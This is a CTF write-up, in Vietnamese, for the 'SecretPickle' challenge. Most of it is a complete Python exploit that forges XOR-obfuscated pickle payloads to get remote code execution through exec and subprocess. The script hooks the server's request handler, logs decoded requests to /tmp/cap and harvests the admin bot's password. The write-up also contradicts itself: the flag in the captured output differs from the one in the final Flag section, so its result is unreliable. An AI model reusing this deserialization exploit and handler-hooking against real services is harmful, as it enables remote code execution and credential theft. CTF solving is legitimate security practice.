# SecretPickle

![alt text](image.png)

## Phân tích source

Đọc source challenge, ứng dụng nhận payload qua URL, sau đó decode bằng hàm kiểu như sau:

```python
payload = secretpickle_load(data)
```

Trong đó `secretpickle_load()` thực chất dùng `pickle.loads()` sau khi base64 decode và XOR dữ liệu.

Vấn đề là `pickle.loads()` không an toàn với dữ liệu do user kiểm soát. Nếu attacker tạo được object có `__reduce__()`, quá trình unpickle có thể gọi tới hàm tùy ý và dẫn tới RCE.

Challenge cố che giấu pickle bằng cách:

1. Bỏ một prefix cố định của pickle object.
2. XOR phần còn lại với một key cố định.
3. Base64 encode dữ liệu.

Nhưng vì prefix và XOR key đều nằm trong source nên ta có thể tự tạo payload hợp lệ.

Các giá trị cần dùng:

```python
# default prefix that every pickled dict has; we don't need to send it every time
SECRETPICKLE_OBJECT_PREFIX = bytes.fromhex("8004 950000000000000000 7d 94 28")

# 128 random bits, so same security as AES-128
SECRETPICKLE_XOR_KEY = bytes.fromhex("77c07f8fd2ae7ad9f5aabc008c79d0d3")
```

## Ý tưởng khai thác

1. Dùng pickle RCE để hook hàm xử lý request chính trên server.
2. Mỗi khi server nhận payload đã unpickle, ghi lại plaintext payload đó vào `/tmp/cap`.
3. Gọi action `adminbot` để bot tự login/whoami.
4. Đọc lại `/tmp/cap` bằng RCE.
5. Trong log sẽ có payload chứa username/password của adminbot, trong đó password chính là flag.

### Script solve

```python
#!/usr/bin/env python3
import base64, pickle, json, urllib.request, subprocess

BASE = "https://torched-wagyu-stuffed-with-charred-dashi-u3kj.gpn24.ctf.kitctf.de"

PREFIX = bytes.fromhex("8004" "950000000000000000" "7d" "94" "28")
KEY = bytes.fromhex("77c07f8fd2ae7ad9f5aabc008c79d0d3")


def xor(d):
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(d))


def sp_dump(obj):
    raw = pickle.dumps(obj)
    trimmed = raw[len(PREFIX):]
    return base64.b64encode(xor(trimmed)).decode()


def sp_load(enc):
    decoded = base64.b64decode(enc)
    raw = PREFIX + xor(decoded)
    return pickle.loads(raw)


def post(payload):
    enc = sp_dump(payload)
    req = urllib.request.Request(f"{BASE}/{enc}", method="POST")
    return sp_load(json.loads(urllib.request.urlopen(req, timeout=60).read()))


def rce_exec(code):
    class E:
        def __reduce__(self):
            return (exec, (code,))

    return post({
        "a": "hello",
        "params": {
            "name": E()
        }
    })


def rce_sh(cmd):
    class E:
        def __reduce__(self):
            return (
                subprocess.check_output,
                (["sh", "-c", cmd + " 2>&1; true"],)
            )

    return post({
        "a": "hello",
        "params": {
            "name": E()
        }
    })["result"][8:-2]


# 1. Hook live FastAPI handler and log plaintext payloads
rce_exec(r'''
import sys

for m in list(sys.modules.values()):
    if hasattr(m, "action_handler") and hasattr(m, "secretpickle_load"):
        old_handler = m.action_handler

        if getattr(old_handler, "_hooked", 0):
            continue

        async def patched_handler(action, params, pl, _old=old_handler):
            try:
                open("/tmp/cap", "a").write(repr(pl) + "\n")
            except Exception:
                pass
            return await _old(action, params, pl)

        patched_handler._hooked = 1
        m.action_handler = patched_handler
''')


# 2. Trigger adminbot
target = b"http://127.0.0.1:80/?a=whoami"
target_b64 = base64.b64encode(target).decode()

try:
    post({
        "a": "adminbot",
        "params": {
            "url": target_b64
        }
    })
except Exception:
    pass


# 3. Read captured payloads
print(rce_sh("cat /tmp/cap"))
```

Kết quả:

```text
"{'a': 'hello', 'params': {'name': None}}\n{'a': 'adminbot', 'params': {'url': 'aHR0cDovLzEyNy4wLjAuMTo4MC8/YT13aG9hbWk='}}\n{'action': 'register', 'params': {'username': 'admin', 'password': 'GPNCTF{th3_PICKl3_wA5_s3cRE7_buT_nEv3r_53cuRe}'}}\n{'action': 'login', 'params': {'username': 'admin', 'password': 'GPNCTF{th3_PICKl3_wA5_s3cRE7_buT_nEv3r_53cuRe}'}}\n{'action': 'whoami', 'params': {}, 'username': 'admin', 'password': 'GPNCTF{th3_PICKl3_wA5_s3cRE7_buT_nEv3r_53cuRe}'}\n{'a': 'whoami', 'params': {}, 'username': 'admin', 'password': 'GPNCTF{th3_PICKl3_wA5_s3cRE7_buT_nEv3r_53cuRe}'}\n
```

## Flag

```text
GPNCTF{thE_PIckle_w4S_seCr37_8u7_n3Ver_53cuRe}
```
